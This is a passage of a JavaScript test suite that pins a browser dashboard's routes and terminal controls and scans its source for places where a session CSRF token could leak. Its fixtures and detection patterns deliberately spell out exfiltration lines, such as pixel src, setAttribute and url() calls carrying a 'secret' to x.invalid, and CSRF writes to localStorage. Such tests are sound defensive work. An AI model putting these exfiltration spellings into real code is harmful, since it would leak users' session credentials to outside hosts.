  assert.deepEqual([...hire.matchAll(/method:\s*'([A-Z]+)'/g)].map((match) => match[1]), ['POST'],
    'the Hire uses a method other than POST');

  const session = await readFile(resolve(source, 'session.ts'), 'utf8');
  const targets = [...session.matchAll(/fetch\(\s*'([^']+)'/g)].map((match) => match[1]);
  assert.deepEqual(
    targets,
    ['/floor/session', '/floor/', '/floor/session/recover'],
    'session startup calls somewhere else too',
  );
  const methods = [...session.matchAll(/method:\s*'([A-Z]+)'/g)].map((match) => match[1]);
  assert.deepEqual(methods, ['POST', 'GET', 'POST'], 'session startup uses a method other than POST, or the one index GET');

  assert.equal(valueBindingsIn(parsedByExtension(controlText, CONTROL_MODULE)).filter(({ name }) => name === 'ROUTES')
    .length, 1, 'control.ts binds ROUTES more than once, so the pinned routes may not be the ones it fetches');

  const requests = {};
  for (const path of await filesUnder(source, ['.ts', '.tsx'])) {
    const relative = path.slice(floor.length + 1);
    const found = requestsIn(await readFile(path, 'utf8'), relative, relative in REQUESTS);
    if (Object.values(found).some((list) => list.length > 0)) requests[relative] = found;
  }
  assert.deepEqual(requests, REQUESTS, 'a path, a method or a fetch reference is not the pinned one');
});

const DOM_URL_WRITE = 'a dynamic DOM src, href, srcset, poster or data assignment';
const DOM_URL_ATTRIBUTE = 'a setAttribute or setAttributeNS src, href, srcset, poster, data or style';

const SESSION_MATERIAL_SINKS = [
  ['localStorage', /\blocalStorage\b/],
  ['sessionStorage', /\bsessionStorage\b/],
  ['IndexedDB', /\bindexedDB\b/],
  ['history state', /\b(?:window\.)?history\.(?:pushState|replaceState)\(\s*(?!null\s*,)/],
  ['window.name', /\bwindow\.name\b/],
  ['a service-worker cache', /\b(?:navigator\.)?serviceWorker\b|\bcaches\s*\./],
  ['a readable cookie', /\bdocument\.cookie\b/],
  ['a query write', /\blocation\.search\s*=|\bsearchParams\.(?:append|set)\(/],
  ['a fragment write', /\blocation\.hash\s*=/],
  ['a navigation', /\blocation\.(?:assign|replace)\(|\blocation\.href\s*=/],
  ['argv', /\b(?:process|Deno)\.argv\b/],
  ['a log', /\bconsole\.(?:debug|error|info|log|warn)\s*\(/],
  // JSX attributes are checked on the syntax tree by `urlAttributesIn`. These
  // two match only a plain `.src =`-style assignment and a `setAttribute(`
  // whose name is in single or double quotes.
  ['a dynamic DOM src, href or srcset assignment', /\.(?:src|href|srcset)\s*=(?!=)/],
  ['a setAttribute src, href, srcset, data or style', /\.setAttribute\(\s*['"](?:src|href|srcset|data|style)['"]/],
  ['a url() in a style string', /\burl\(|\bimage-set\(/],
];

function sessionMaterialSinksIn(text) {
  return SESSION_MATERIAL_SINKS
    .filter(([, pattern]) => pattern.test(text))
    .map(([name]) => name);
}

/**
 * Two more DOM URL sinks, scanned beside `SESSION_MATERIAL_SINKS`. They match
 * `.src`, `.href`, `.srcset`, `.poster` or `.data` with the `.` right before
 * the name, or the same name quoted in brackets, written with `=`, `+=`,
 * `||=`, `&&=` or `??=`; and a `setAttribute(` or `setAttributeNS(` whose
 * name, in single, double or backtick quotes and in upper or lower case, is
 * one of those or `style`.
 */
const DOM_URL_SINKS = [
  [DOM_URL_WRITE, /(?:\.|\[\s*['"`])(?:src|href|srcset|poster|data)(?:['"`]\s*\])?\s*(?:\+|\|\||&&|\?\?)?=(?!=)/],
  [DOM_URL_ATTRIBUTE, /\.setAttribute(?:\s*\(|NS\s*\([^,]*,)\s*['"`](?:[\w-]+:)?(?:src|href|srcset|poster|data|style)['"`]/i],
];

function domUrlSinksIn(text) {
  return DOM_URL_SINKS.filter(([, pattern]) => pattern.test(text)).map(([name]) => name);
}

const ADMITTED_VIEW_STORAGE = Object.freeze({ path: 'src/renderer/view.ts', line: 'return window.localStorage;' });
const ADMITTED_FONT_STORAGE = Object.freeze({ path: TERMINAL_CONTROLS,
  line: "return typeof window === 'undefined' ? null : window.localStorage;" });
const TERMINAL_CONTROL_FUNCTIONS = [
  String.raw`function browserStorage(): Storage | null {
  return typeof window === 'undefined' ? null : window.localStorage;
}`,
  String.raw`export function readFontSize(storage: StoragePort = browserStorage): number {
  try {
    const value = storage()?.getItem(FONT_SIZE_KEY);
    if (value !== undefined && value !== null && /^\d+$/.test(value)) {
      const size = Number(value);
      if (Number.isInteger(size) && size >= MIN_FONT_SIZE && size <= MAX_FONT_SIZE) return size;
    }
  } catch {}
  return DEFAULT_FONT_SIZE;
}`,
  String.raw`export function writeFontSize(size: number, storage: StoragePort = browserStorage): void {
  try {
    if (Number.isInteger(size) && size >= MIN_FONT_SIZE && size <= MAX_FONT_SIZE) {
      storage()?.setItem(FONT_SIZE_KEY, String(size));
    }
  } catch {}
}`,
  String.raw`export function copyTerminalSelection(screen: Pick<Terminal, 'getSelection'> | null,
  clipboard: ClipboardPort = () => navigator.clipboard ?? null): Promise<CopyResult> {
  const selection = screen?.getSelection() ?? '';
  if (selection === '') return Promise.resolve({ kind: 'empty' });
  const refused: CopyResult = { kind: 'refused', selection };
  try {
    const target = clipboard();
    if (target === null) return Promise.resolve(refused);
    return target.writeText(selection).then(() => ({ kind: 'copied' } as const), () => refused);
  } catch {
    return Promise.resolve(refused);
  }
}`,
  String.raw`export function fitTerminal(term: Pick<Terminal, 'element' | 'cols' | 'rows' | 'resize'>,
  host: Pick<HTMLElement, 'getBoundingClientRect'>): void {
  const drawn = term.element?.querySelector('.xterm-screen')?.getBoundingClientRect();
  if (drawn === undefined) return;
  const size = fitGrid(host.getBoundingClientRect(),
    { cols: term.cols, rows: term.rows, width: drawn.width, height: drawn.height });
  if (size !== null && (size.cols !== term.cols || size.rows !== term.rows)) term.resize(size.cols, size.rows);
  resizeTerminal();
}`,
];
const TERMINAL_COMMAND_FUNCTION = String.raw`function command(action: TerminalCommand): void {
    if (action === 'copy') {
      void copyTerminalSelection(screen.current).then(setCopy);
    } else if (action === 'expand') {
      const focused = document.activeElement;
      setExpanded((current) => !current);
      requestAnimationFrame(() => {
        if (focused instanceof HTMLElement && focused.isConnected) focused.focus();
      });
    } else {
      setFontSize((current) => zoomFontSize(current, action));
    }
  }`;

function functionPinsIn(syntax, names) {
  const found = [];
  (function walk(node) {
    if (ts.isFunctionDeclaration(node) && names.includes(node.name?.text)) found.push(node.getText(syntax));
    ts.forEachChild(node, walk);
  })(syntax);
  return found;
}

function terminalControlsIn(text) {
  const syntax = parsedByExtension(text, TERMINAL_CONTROLS);
  const roots = ['MIN_FONT_SIZE', 'MAX_FONT_SIZE', 'DEFAULT_FONT_SIZE', 'FONT_SIZE_KEY', 'browserStorage',
    'readFontSize', 'writeFontSize', 'copyTerminalSelection', 'fitTerminal', 'fitGrid', 'resizeTerminal',
    'Number', 'String', 'window', 'navigator'];
  const bindings = valueBindingsIn(syntax);
  const accesses = [];
  const storageReferences = [];
  (function walk(node) {
    if (ts.isTypeNode(node)) return;
    if (ts.isIdentifier(node) && ['browserStorage', 'FONT_SIZE_KEY'].includes(node.text)
      && !bindings.some(({ declaredBy }) => declaredBy.name === node)) storageReferences.push(node.parent.getText(syntax));
    if ((ts.isPropertyAccessExpression(node) || ts.isElementAccessExpression(node))
      && ['localStorage', 'getItem', 'setItem', 'getSelection', 'writeText', 'querySelector',
        'input', 'paste', 'write', 'writeln', 'onData'].includes(spelledName(node))) {
      accesses.push(ts.isCallExpression(node.parent) && node.parent.expression === node
        ? node.parent.getText(syntax) : node.getText(syntax));
    }
    ts.forEachChild(node, walk);
  })(syntax);
  return {
    imports: syntax.statements.filter(ts.isImportDeclaration).map((node) => node.getText(syntax)),
    constants: syntax.statements.filter(ts.isVariableStatement)
      .flatMap((node) => node.declarationList.declarations.map((declaration) => declaration.getText(syntax))),
    functions: functionPinsIn(syntax, ['browserStorage', 'readFontSize', 'writeFontSize', 'copyTerminalSelection', 'fitTerminal']),
    bindings: roots.map((name) => [name, bindings.filter((binding) => binding.name === name).length]),
    accesses,
    storageReferences,
  };
}

const TERMINAL_CONTROL_PINS = {
  imports: ["import type { Terminal } from './grid.ts';", "import { fitGrid, resizeTerminal } from './terminal.ts';"],
  constants: ['MIN_FONT_SIZE = 10', 'MAX_FONT_SIZE = 32', 'DEFAULT_FONT_SIZE = 14',
    "FONT_SIZE_KEY = 'dudes.terminal.font-size'"],
  functions: TERMINAL_CONTROL_FUNCTIONS,
  bindings: [...['MIN_FONT_SIZE', 'MAX_FONT_SIZE', 'DEFAULT_FONT_SIZE', 'FONT_SIZE_KEY', 'browserStorage',
    'readFontSize', 'writeFontSize', 'copyTerminalSelection', 'fitTerminal', 'fitGrid', 'resizeTerminal'].map((name) => [name, 1]),
    ...['Number', 'String', 'window', 'navigator'].map((name) => [name, 0])],
  accesses: ['window.localStorage', 'storage()?.getItem(FONT_SIZE_KEY)',
    'storage()?.setItem(FONT_SIZE_KEY, String(size))', 'screen?.getSelection()', 'target.writeText(selection)',
    "term.element?.querySelector('.xterm-screen')"],
  storageReferences: ['storage: StoragePort = browserStorage', 'storage()?.getItem(FONT_SIZE_KEY)',
    'storage: StoragePort = browserStorage', 'storage()?.setItem(FONT_SIZE_KEY, String(size))'],
};

test('terminal controls persist only the bounded font key, copy the selection and measure the grid without input', async () => {
  const text = await readFile(resolve(floor, TERMINAL_CONTROLS), 'utf8');
  assert.deepEqual(terminalControlsIn(text), TERMINAL_CONTROL_PINS);
  for (const [original, replacement] of [
    ["'dudes.terminal.font-size'", "'csrf'"],
    ['String(size)', 'String(currentFloorSession()?.csrf)'],
    ['Number.isInteger(size)', 'Number.isFinite(size)'],
    ["from './terminal.ts'", "from '../../session.ts'"],
    ['screen?.getSelection()', 'screen?.getSelection() + secret'],
    ['target.writeText(selection)', 'target.writeText(secret)'],
    ["querySelector('.xterm-screen')", "querySelector('textarea')"],
    ['resizeTerminal();', "writeTerminal('injected');"],
  ]) {
    assert.ok(text.includes(original), original);
    assert.notDeepEqual(terminalControlsIn(text.replace(original, replacement)), TERMINAL_CONTROL_PINS, replacement);
  }
  for (const extra of [
    "function planted() { const FONT_SIZE_KEY = 'csrf'; }",
    'const Number = { isInteger: () => true };',
    "function planted(storage) { storage.setItem('csrf', secret); }",
    "const saved = storage['getItem'];",
    "function planted(term) { term.element?.querySelector('.xterm-screen'); }",
    'export { browserStorage };',
    'function planted() { Object.assign(browserStorage(), { csrf: secret }); }',
    'Object.assign(browserStorage(), { csrf: secret });',
    "function planted(term) { term.input('injected'); }",
    "function planted(term) { term['paste']('injected'); }",
  ]) assert.notDeepEqual(terminalControlsIn(text + '\n' + extra), TERMINAL_CONTROL_PINS, extra);
});

test('terminal copy fallback is one readonly selection field and local commands stay pinned', async () => {
  const text = await readFile(resolve(floor, TERMINAL_PANEL), 'utf8');
  function localUiIn(text) {
    const syntax = parsedByExtension(text, TERMINAL_PANEL);
    return {
      fields: intrinsicElementsIn(syntax).filter((node) => ['input', 'textarea', 'select'].includes(node.tagName.text))
        .map((node) => node.getText(syntax)),
      commands: functionPinsIn(syntax, ['command']),
      bindings: valueBindingsIn(syntax).filter(({ name, declaredBy }) => name === 'command'
        && ts.findAncestor(declaredBy, ts.isTypeNode) === undefined).length,
    };
  }
  const expected = {
    fields: [String.raw`<textarea readOnly aria-label="Terminal selection to copy"
          value={copy.selection} onFocus={(event) => event.currentTarget.select()} />`],
    commands: [TERMINAL_COMMAND_FUNCTION],
    bindings: 1,
  };
  assert.deepEqual(localUiIn(text), expected);
  for (const [original, replacement] of [
    ['<textarea readOnly', '<textarea'],
    ['value={copy.selection}', 'value={currentFloorSession()?.csrf}'],
    ['copyTerminalSelection(screen.current)', 'copyTerminalSelection(screen.current); writeTerminal(copy.selection)'],
    ["setFontSize((current) => zoomFontSize(current, action));", "writeTerminal(action);"],
  ]) {
    assert.ok(text.includes(original), original);
    assert.notDeepEqual(localUiIn(text.replace(original, replacement)), expected, replacement);
  }
  assert.notDeepEqual(localUiIn(text + '\nfunction command() {}'), expected);
});

const ASSET_URL_CALL = /\burl\(\$\{(\w+)\}\)/g;

test('font preference storage admits one exact getter in its own module and still finds other sinks', async () => {
  const text = await readFile(resolve(floor, TERMINAL_CONTROLS), 'utf8');
  const clean = unadmittedSinksIn(text, TERMINAL_CONTROLS);
  assert.deepEqual(clean.found, []);
  assert.equal(clean.fontStorageHits, 1);
  assert.deepEqual(unadmittedSinksIn(text, 'other.ts').found, ['localStorage']);
  assert.deepEqual(unadmittedSinksIn(text + "\nlocalStorage.setItem('csrf', secret);", TERMINAL_CONTROLS).found,
    ['localStorage']);
  assert.equal(unadmittedSinksIn(text + '\n' + ADMITTED_FONT_STORAGE.line, TERMINAL_CONTROLS).fontStorageHits, 2);
  for (const extra of ['sessionStorage.csrf = secret;', 'console.log(secret);', "location.hash = '#csrf=' + secret;"]) {
    assert.ok(unadmittedSinksIn(text + '\n' + extra, TERMINAL_CONTROLS).found.length > 0, extra);
  }
});

function unadmittedSinksIn(text, relative) {
  let assets;
  let scanned = text.replace(ASSET_URL_CALL, (whole, name) => {
    assets ??= staticAssetImportIdentifiersIn(parsedByExtension(text, relative));
    return assets.has(name) ? '' : whole;
  });
  let viewStorageHits = 0;
  let fontStorageHits = 0;
  if (relative === ADMITTED_VIEW_STORAGE.path) {
    scanned = scanned.replace(/^.*$/gm, (line) => {
      if (line.trim() === ADMITTED_VIEW_STORAGE.line) {
        viewStorageHits += 1;
        return '';
      }
      return line;
    });
  }
  if (relative === ADMITTED_FONT_STORAGE.path) {
    scanned = scanned.replace(/^.*$/gm, (line) => {
      if (line.trim() === ADMITTED_FONT_STORAGE.line) {
        fontStorageHits += 1;
        return '';
      }
      return line;
    });
  }
  return { found: [...sessionMaterialSinksIn(scanned), ...domUrlSinksIn(scanned)],
    viewStorageHits, fontStorageHits };
}

test('session material has no browser persistence, URL, argv or log sink', async () => {
  const fixture = `
    localStorage.setItem('csrf', secret); sessionStorage.csrf = secret;
    indexedDB.open(secret); history.replaceState({ csrf: secret }, '', '/floor/');
    window.name = secret; navigator.serviceWorker.register('/secret.js');
    caches.open(secret); document.cookie = secret; location.search = '?csrf=' + secret;
    location.hash = '#csrf=' + secret; process.argv.push(secret); console.log(secret);
    location.assign('/floor/?goal=' + secret);
    pixel.src = \`https://x.invalid/p.gif?c=\${secret}\`;
    node.setAttribute('src', \`https://x.invalid/p.gif?c=\${secret}\`);
    el.style.backgroundImage = \`url(https://x.invalid/?c=\${secret})\`;
  `;
  assert.deepEqual(
    sessionMaterialSinksIn(fixture).sort(),
    SESSION_MATERIAL_SINKS.map(([name]) => name).sort(),
    'a session-material sink pattern no longer finds the spelling it names',
  );
  assert.deepEqual(
    sessionMaterialSinksIn("history.replaceState(null, '', '/floor/');"),
    [],
    'scrubbing the bootstrap without storing state remains allowed',
  );
  for (const [spelling, kind] of [
    ["pixel['src'] = `https://x.invalid/p.gif?c=${secret}`;", DOM_URL_WRITE],
    ['video.poster = `https://x.invalid/p.gif?c=${secret}`;', DOM_URL_WRITE],
    ['embed.data = `https://x.invalid/p.gif?c=${secret}`;', DOM_URL_WRITE],
    ['image.src += location.hash;', DOM_URL_WRITE],
    ['image.src ??= `https://x.invalid/p.gif?c=${secret}`;', DOM_URL_WRITE],
    ["node.setAttribute(`src`, `https://x.invalid/p.gif?c=${secret}`);", DOM_URL_ATTRIBUTE],
    ["node.setAttribute('SRC', `https://x.invalid/p.gif?c=${secret}`);", DOM_URL_ATTRIBUTE],
    ["node.setAttribute ('src', `https://x.invalid/p.gif?c=${secret}`);", DOM_URL_ATTRIBUTE],
    ["node.setAttributeNS (null, 'href', `https://x.invalid/?c=${secret}`);", DOM_URL_ATTRIBUTE],
    ["node.setAttributeNS(null, 'href', `https://x.invalid/?c=${secret}`);", DOM_URL_ATTRIBUTE],
    ["node.setAttributeNS(XLINK, 'xlink:href', `https://x.invalid/?c=${secret}`);", DOM_URL_ATTRIBUTE],
  ]) {
    assert.deepEqual(domUrlSinksIn(spelling), [kind], `${spelling} is not found`);
  }
  assert.deepEqual(domUrlSinksIn("typeof event.data === 'string' ? event.data : String(event.data)"), []);
  assert.deepEqual(sessionMaterialSinksIn('<img src="/logo.png" />'), []);
  assert.deepEqual(sessionMaterialSinksIn('image.src = tilesUrl;'),
    ['a dynamic DOM src, href or srcset assignment']);
  assert.deepEqual(domUrlSinksIn('image.src = tilesUrl;'), [DOM_URL_WRITE]);
  assert.deepEqual(sessionMaterialSinksIn('data-agent-id={row.id}'), []);
  assert.deepEqual(sessionMaterialSinksIn("connect(streamUrl(location), streamProtocols(session.csrf));"), []);

  assert.deepEqual(
    unadmittedSinksIn(
      "import castUrl from './cast.png';\nel.style.backgroundImage = `url(${castUrl})`;", 'clean.tsx',
    ).found,
    [],
  );
  assert.deepEqual(
    unadmittedSinksIn(
      "import castUrl from './cast.png';\nel.style.backgroundImage = `url(${castUrl}?c=${secret})`;", 'plant.tsx',
    ).found,
    ['a url() in a style string'],
  );
  assert.deepEqual(
    unadmittedSinksIn(
      "import castUrl from './cast.png';\nel.style.backgroundImage = `image-set(\"${castUrl}\" 1x)`;", 'plant.tsx',
    ).found,
    ['a url() in a style string'],
  );
  assert.doesNotThrow(() => parsedByExtension('export const id = <T>(x: T) => x;', 'generic.ts'));
  assert.throws(() => parsedByExtension('export const id = <T>(x: T) => x;', 'generic.tsx'),
    /generic\.tsx no longer parses/);

  const carrying = [];
  let viewStorageHits = 0;
  let fontStorageHits = 0;
  for (const path of await filesUnder(source, ['.ts', '.tsx'])) {
    const relative = path.slice(floor.length + 1);
    const text = await readFile(path, 'utf8');
    const { found, viewStorageHits: storageHits, fontStorageHits: fontHits } = unadmittedSinksIn(text, relative);
    viewStorageHits += storageHits;
    fontStorageHits += fontHits;
    if (found.length > 0) carrying.push(`${relative}: ${found.join(', ')}`);
  }
  assert.deepEqual(carrying, [], 'session material gained a browser, URL, argv or log sink');
  assert.equal(viewStorageHits, 1, 'the view-only storage getter moved, disappeared, or was duplicated');
  assert.equal(fontStorageHits, 1, 'the font-only storage getter moved, disappeared, or was duplicated');
  const viewText = await readFile(resolve(floor, ADMITTED_VIEW_STORAGE.path), 'utf8');
  const viewSyntax = parsedByExtension(viewText, ADMITTED_VIEW_STORAGE.path);
  const imports = viewSyntax.statements.filter(ts.isImportDeclaration);
  assert.deepEqual(imports.map((node) => [node.moduleSpecifier.text, node.importClause?.isTypeOnly]),
    // The office registry is layout data the page is built with, and the pin is checked against its ids.
    [['./floor/store.ts', true], ['./archive.ts', true], ['./detailTabs.ts', true], ['./office3d/offices.ts', false],
      ['./office3d/offices.ts', true]], 'view preferences gained a runtime source of daemon or session material');
  for (const name of ['readViewPreferences', 'writeViewPreferences', 'readAgentIds', 'writeAgentIds', 'readDetailTab', 'writeDetailTab',
    'readOfficePin', 'writeOfficePin', 'readDesktopNotificationChoice', 'writeDesktopNotificationChoice']) {
    const fn = viewSyntax.statements.find((node) => ts.isFunctionDeclaration(node) && node.name?.text === name);
    assert.equal(fn?.body?.statements.length, 1, `${name} moved storage outside its try/catch`);
    assert.ok(ts.isTryStatement(fn.body.statements[0]) && fn.body.statements[0].catchClause !== undefined,
      `${name} no longer catches a refused browser storage read or write`);
  }
  for (const [name, body] of [
    ['readAgentOrder', 'return readAgentIds(`dudes.floor.agent-order.${view}`, storage);'],
    ['writeAgentOrder', 'return writeAgentIds(`dudes.floor.agent-order.${view}`, ids, storage);'],
    ['readHiddenArchiveIds', "return readAgentIds('dudes.floor.hidden-archive', storage);"],
    ['writeHiddenArchiveIds', "return writeAgentIds('dudes.floor.hidden-archive', ids, storage);"],
  ]) {
    assert.equal(bindingNamesIn(viewSyntax).filter((binding) => binding.name === name).length, 1);
    const fn = viewSyntax.statements.find((node) => ts.isFunctionDeclaration(node) && node.name?.text === name);
    assert.deepEqual(fn.body.statements.map((statement) => statement.getText(viewSyntax)), [body],
      `${name} no longer delegates only its view key to the guarded storage helper`);
  }
});

/**
 * Text spellings of authority the floor does not request: an answer method, a
 * steer, terminal input, a generic RPC envelope or a local operator method.
 * The Hire and the answer are each one typed POST, and match no pattern here.
 */
const OTHER_AUTHORITY = [
  ['an answer method', /agent\.answer|\banswer(?:Agent|Question)\b/],
  ['a steer', /\bsteer/i],
  ['terminal input', /\bpty\b|pty\.(?:write|data)|agent\.attach|\bxterm\b|\bstdin\b/i],
  ['a generic RPC envelope', /jsonrpc|['"]method['"]\s*:|\/rpc\b/i],
  ['a local operator method', /\bagent\.(?:hire|retire)\b|\bgoal\.set\b|\bloop\.(?:pause|resume|halt)\b/],
];

/**
 * The terminal panel's grid is the one terminal the floor draws, offered only
 * with the `terminal` sibling. Its name matches the terminal-input pattern,
 * admitted on these lines of these two files and nowhere else. The panel
 * writes no input of its own: "the terminal channel sends only…" pins its one
 * writer.
 */
const TERMINAL_GRID = 'src/renderer/terminal/grid.ts';
const ADMITTED_TERMINAL_LINES = Object.freeze({
  [TERMINAL_GRID]: ["import '@xterm/xterm/css/xterm.css';", "export { Terminal } from '@xterm/xterm';"],
  [TERMINAL_CONTROLS]: ["const drawn = term.element?.querySelector('.xterm-screen')?.getBoundingClientRect();"],
});

/**
 * Retire's halted line tells the operator which local call retires a halted
 * agent. It names that method as text on this one line, admitted here and
 * nowhere else; the page never calls it.
 */
const ADMITTED_OPERATOR_LINES = Object.freeze({
  [RETIRE_PANEL]: ['const HALTED_LINE = <>A halted agent is retired with the local <code>agent.retire</code> call.</>;'],
});

/** The answer route. The answer module names it once, in its one fetch, and nothing else names it. */
const ANSWER_ROUTE = /\/floor\/answer\b/g;

/** The pause and resume routes. The control module names each once, and nothing else names either. */
const CONTROL_ROUTES = /\/floor\/(?:pause|resume)\b/g;

/** The retire route. The retire module names it once, in its one fetch, and nothing else names it. */
const RETIRE_ROUTE = /\/floor\/retire\b/g;

test('no source asks for an answer method, steer, terminal or generic RPC, and only their own modules name the answer, pause, resume and '
  + 'retire routes, but for the terminal panel\'s and Retire\'s pinned lines', async () => {
  const fixture = `
    fetch('/floor/answer'); send({ type: 'agent.answer' }); steerAgent(); pty.write(bytes);
    const envelope = { jsonrpc: '2.0', "method": 'x' }; call('agent.hire'); call('goal.set');
    fetch('/floor/pause'); fetch('/floor/resume'); fetch('/floor/retire'); fetch('/floor/retirements');
  `;
  assert.deepEqual(
    OTHER_AUTHORITY.filter(([, pattern]) => pattern.test(fixture)).map(([name]) => name).sort(),
    OTHER_AUTHORITY.map(([name]) => name).sort(),
    'an authority pattern no longer finds the spelling it names',
  );
  assert.equal([...fixture.matchAll(ANSWER_ROUTE)].length, 1, 'the route pattern no longer finds the route');
  assert.equal([...fixture.matchAll(CONTROL_ROUTES)].length, 2, 'the control route pattern no longer finds both routes');
  assert.equal([...fixture.matchAll(RETIRE_ROUTE)].length, 1, 'the retire route pattern no longer finds the route, or finds a longer one');
  const carrying = [];
  const naming = {};
  const controlNaming = {};
  const retireNaming = {};
  const [, TERMINAL_INPUT] = OTHER_AUTHORITY.find(([name]) => name === 'terminal input');
  const [, OPERATOR_METHOD] = OTHER_AUTHORITY.find(([name]) => name === 'a local operator method');
  const terminalLines = {};
  const operatorLines = {};
  for (const path of await filesUnder(source, ['.ts', '.tsx'])) {
    const relative = path.slice(floor.length + 1);
    const text = await readFile(path, 'utf8');
    let found = OTHER_AUTHORITY.filter(([, pattern]) => pattern.test(text)).map(([name]) => name);
    if (Object.hasOwn(ADMITTED_TERMINAL_LINES, relative)) {
      terminalLines[relative] = text.split('\n').map((line) => line.trim()).filter((line) => TERMINAL_INPUT.test(line));
      if (JSON.stringify(terminalLines[relative]) === JSON.stringify(ADMITTED_TERMINAL_LINES[relative])) {
        found = found.filter((name) => name !== 'terminal input');
      }
    }
    if (Object.hasOwn(ADMITTED_OPERATOR_LINES, relative)) {
      operatorLines[relative] = text.split('\n').map((line) => line.trim()).filter((line) => OPERATOR_METHOD.test(line));
      if (JSON.stringify(operatorLines[relative]) === JSON.stringify(ADMITTED_OPERATOR_LINES[relative])) {
        found = found.filter((name) => name !== 'a local operator method');
      }
    }
    if (found.length > 0) carrying.push(`${relative}: ${found.join(', ')}`);
    const routes = [...text.matchAll(ANSWER_ROUTE)].length;
    if (routes > 0) naming[relative] = routes;
    const controls = [...text.matchAll(CONTROL_ROUTES)].length;
    if (controls > 0) controlNaming[relative] = controls;
    const retires = [...text.matchAll(RETIRE_ROUTE)].length;
    if (retires > 0) retireNaming[relative] = retires;
  }
  assert.deepEqual(carrying, [],
    'the floor asks for authority beyond selection, retry, one Hire, one answer, one pause or resume and one Retire');
  assert.deepEqual(terminalLines, ADMITTED_TERMINAL_LINES, 'the terminal names its grid on lines not admitted');
  assert.deepEqual(operatorLines, ADMITTED_OPERATOR_LINES, 'Retire names the local retire method on lines not admitted');
  assert.deepEqual(naming, { [ANSWER_MODULE]: 1 }, 'the answer route is named outside its module, or twice');
  assert.deepEqual(controlNaming, { [CONTROL_MODULE]: 2 },
    'a pause or resume route is named outside its module, or more than once');
  assert.deepEqual(retireNaming, { [RETIRE_MODULE]: 1 }, 'the retire route is named outside its module, or twice');
});

/** The goal route. The goal module names it once, in its one fetch, and nothing else names it. */
const GOAL_ROUTE = /\/floor\/goal\b/g;
const CHAT_ROUTES = /\/floor\/chat\/(?:send|cancel)\b/g;

test('only the Chat module names its two routes and its field writes only the in-memory draft', async () => {
  assert.equal([..."fetch('/floor/chat/send'); fetch('/floor/chat/cancel'); fetch('/floor/chat/sends');".matchAll(CHAT_ROUTES)].length, 2);
  const naming = {};
  for (const path of await filesUnder(source, ['.ts', '.tsx'])) {
    const routes = [...(await readFile(path, 'utf8')).matchAll(CHAT_ROUTES)].length;
    if (routes > 0) naming[path.slice(floor.length + 1)] = routes;
  }
  assert.deepEqual(naming, { [CHAT_MODULE]: 2 });
  assert.deepEqual(fieldsIn(await readFile(resolve(floor, CHAT_PANEL), 'utf8')), [{ tag: 'textarea', name: 'chat_text',
    type: null, change: '(event) => editChatDraft(row.id, event.currentTarget.value)' }]);
});

test('Chat requires its own fresh sibling and revokes its mounted history and actions with authority', async () => {
  const { ChatPanelView } = await server.ssrLoadModule('/src/renderer/chat/ChatPanel.tsx');
  const row = working();
  const base = floorWith(row);
  const chat = { enabled: true, max_text_bytes: 4096, pending: [{ agent_id: ADA, note_lsn: '7', goal_id: null,
    text: 'Browser note', state: 'queued', turn_id: null, cancellable: true, reason: null }], turns: [], context_sent: [] };
  const action = { drafts: new Map(), acknowledged: [], answerTargets: new Map(), attempt: null, outcome: null, sending: false, uncertain: false, problem: null };
  const on = { ...base, chat };
  assert.equal(chatGate(on, row).open, true);
  const draw = floor => renderToStaticMarkup(createElement(ChatPanelView, { floor, row, action }));
  assert.match(draw(on), /Browser note/);
  assert.match(draw(on), /class="chat-cancel"/);
  for (const floor of [base, { ...on, chat: null }, { ...on, phase: 'closed' }, { ...on, stale: true },
    { ...on, snapshotEpoch: on.epoch - 1 }, { ...on, agents: [] }]) {
    assert.equal(chatGate(floor, row).open, false);
    assert.equal(draw(floor), '');
  }
});

test('only the goal module names the goal route, and it names it once', async () => {
  assert.equal([..."fetch('/floor/goal'); fetch('/floor/goals');".matchAll(GOAL_ROUTE)].length, 1,
    'the goal route pattern no longer finds the route, or finds a longer one');
  const naming = {};
  for (const path of await filesUnder(source, ['.ts', '.tsx'])) {
    const routes = [...(await readFile(path, 'utf8')).matchAll(GOAL_ROUTE)].length;
    if (routes > 0) naming[path.slice(floor.length + 1)] = routes;
  }
  assert.deepEqual(naming, { [GOAL_MODULE]: 1 }, 'the goal route is named outside its module, or twice');
});

test('only the goal module names the renew route, and it names it once', async () => {
  const renewRoute = /\/floor\/renew\b/g;
  assert.equal([..."fetch('/floor/renew'); fetch('/floor/renews');".matchAll(renewRoute)].length, 1,
    'the renew route pattern no longer finds the route, or finds a longer one');
  const naming = {};
  for (const path of await filesUnder(source, ['.ts', '.tsx'])) {
    const routes = [...(await readFile(path, 'utf8')).matchAll(renewRoute)].length;
    if (routes > 0) naming[path.slice(floor.length + 1)] = routes;
  }
  assert.deepEqual(naming, { [GOAL_MODULE]: 1 }, 'the renew route is named outside its module, or twice');
});

/**
 * A halt route, or a `halt` member in anything the page could send. Neither
 * route, no request member and no label may name halt: the browser can
 * neither issue a halt nor lift one.
 */
const HALT_NAMED = /\/floor\/halt\b|['"]?\bhalt['"]?\s*\??\s*:/;
const CONTROL_LABELS = new Set(['Pause', 'Resume', 'Sending…', 'Check status', 'Checking…', 'Dismiss receipt']);

test('no control names halt: no route or member, and no label says halt or restart', async () => {
  // The control: each planted halt spelling is found, and the flag the page reads is not.
  for (const planted of ["fetch('/floor/halt')", 'const body = { halt: true };', 'JSON.stringify({ "halt": 1 })',
    "{ 'halt' : false }", 'halt?: boolean']) {
    assert.match(planted, HALT_NAMED, `${planted} is not found`);
  }
  for (const clean of ['row.halted === true', '{ halted: row.halted === true }', 'A halt stands on this agent.']) {
    assert.doesNotMatch(clean, HALT_NAMED, `${clean} is taken for a halt control`);
  }
  const naming = [];
  for (const path of await filesUnder(source, ['.ts', '.tsx'])) {
    if (HALT_NAMED.test(await readFile(path, 'utf8'))) naming.push(path.slice(floor.length + 1));
  }
  assert.deepEqual(naming, [], 'a source names a halt route or member');

  // The labels the controls render, over the states this sweep draws.
  const { ControlStripView, ControlStatusView } = await server.ssrLoadModule('/src/renderer/control/ControlPanel.tsx');
  const idle = { attempt: null, sending: false, outcome: null, uncertain: false, askedAtEpoch: 0, refusedUnder: null,
    problem: null };
  const labels = new Set();
  const collect = (html) => {
    for (const [, text] of html.matchAll(/<button\b[^>]*>([^<]*)<\/button>/g)) labels.add(text);
  };
  for (const paused of [false, true]) {
    for (const halted of [false, true]) {
      for (const kind of [{ mode: 'managed', status: 'running' }, { mode: 'attached', status: 'attached' }]) {
        const state = floorWith(working({ ...kind, paused, halted }), undefined, CONTROL);
        const row = state.agents[0];
